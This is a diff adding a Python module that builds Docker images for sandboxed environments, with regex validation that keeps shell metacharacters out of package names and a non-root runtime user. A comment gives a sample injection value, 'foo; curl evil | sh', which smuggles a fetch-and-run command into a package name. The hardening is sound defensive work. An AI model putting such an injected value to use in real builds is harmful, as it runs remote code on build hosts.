@@ -1,0 +1,102 @@
+"""Shared container-spawning machinery (sandbox executor + docker provider).
+
+Per-env image builds with RD-2 package validation, schema-versioned image
+tags, the isolation-runtime probe, and the hardened ``containers.run``
+keyword set live here so a hardening fix lands on every container Noodle
+ever spawns. No DB access; safe to import from worker_main.
+"""
+
+from __future__ import annotations
+
+import logging
+import re
+from typing import Any
+
+from app.config import settings
+
+logger = logging.getLogger(__name__)
+
+# Bump whenever the generated Dockerfile changes shape — stale images built
+# from the old recipe (e.g. root-running v1 images) must never be reused.
+IMAGE_SCHEMA_VERSION = "v2"
+
+# RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
+# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
+# the generated Dockerfile. Shell metacharacters in a package name (e.g.
+# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
+# admin-controlled (``environment:write``), but we validate as defence-in-depth.
+# Each requirement is restricted to a PEP 508 name + optional extras + optional
+# version specifiers using only characters that cannot break out of the shell
+# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
+_PKG_SPEC_RE = re.compile(
+    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
+    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
+    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
+    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
+)
+_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")
+
+
+def _validate_packages(packages: list[str]) -> list[str]:
+    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
+    safe: list[str] = []
+    for raw in packages:
+        spec = str(raw).strip()
+        if not spec:
+            continue
+        if not _PKG_SPEC_RE.match(spec):
+            raise ValueError(
+                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
+                "version specifiers are allowed (no shell metacharacters)"
+            )
+        safe.append(spec)
+    return safe
+
+
+def _validate_python_version(version: str) -> str:
+    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
+    v = str(version or "").strip()
+    if not _PY_VERSION_RE.match(v):
+        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
+    return v
+
+
+def image_tag_for(env_payload: dict) -> str:
+    return (
+        f"noodle-env:{env_payload.get('id', 'default')}"
+        f"-{env_payload.get('packages_hash', 'latest')}"
+        f"-{IMAGE_SCHEMA_VERSION}"
+    )
+
+
+def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
+    """Build the env image if absent. Sync — call via run_in_executor."""
+    try:
+        client.images.get(image_tag)
+        return  # cache hit
+    except Exception:  # noqa: BLE001 — NotFound; build below
+        pass
+
+    python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
+    packages = _validate_packages(env_payload.get("packages") or [])
+    packages_str = " ".join(packages)
+    install_line = (
+        f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core "
+        f"{packages_str}".rstrip()
+    )
+
+    # Non-root: installs run as root, the runtime does not. HOME is /tmp at
+    # runtime (tmpfs) because the rootfs — including /home — is read-only.
+    dockerfile = (
+        f"FROM python:{python_version}-slim\n"
+        "RUN pip install uv --quiet\n"
+        f"{install_line}\n"
+        "RUN useradd --uid 65532 --create-home --shell /usr/sbin/nologin noodle\n"
+        "USER noodle\n"
+        'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
+    )
+
+    import io  # noqa: PLC0415
+
+    client.images.build(fileobj=io.BytesIO(dockerfile.encode()), tag=image_tag, rm=True)
+    logger.info("built docker image %s", image_tag)
